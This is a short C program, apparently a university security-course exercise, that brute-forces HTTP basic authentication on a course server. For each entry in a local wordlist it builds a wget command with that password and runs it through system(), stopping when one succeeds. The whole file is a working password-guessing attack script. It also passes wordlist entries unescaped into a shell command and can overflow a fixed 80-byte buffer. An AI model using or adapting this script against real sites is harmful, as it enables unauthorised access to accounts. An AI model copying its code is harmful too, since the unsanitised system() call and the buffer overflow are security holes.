 #include <stdio.h>
#include <stdlib.h>
#include <sys/times.h>
#include <strings.h>
#include <ctype.h>

int main()
{
  char *wordptr = " word";
  FILE *fp;
  int syst = 1;
  char string1[80], string2[50];
  strcpy(string1, "wget --http-user= --http-passwd=");
  strcpy(string2, " http://sec-crack.cs.rmit.edu./SEC/2/");
  char words[30];
  fp = fopen("words", "r");
  while(wordptr != NULL)
  {
    wordptr = fgets(words, 30, fp);
    if (wordptr == NULL) exit(1);
    words [ strlen(words) - 1 ] = '\0';
    strcat(string1, words);
    strcat(string1, string2);
    printf("\n %s \n",string1);
    syst = system(string1);
    if (syst == 0)
    {
       exit(1);
    }
    strcpy(string1, "");
    strcpy(string1, "wget --http-user= --http-passwd=");
    printf("%s", words);
    
  }
}
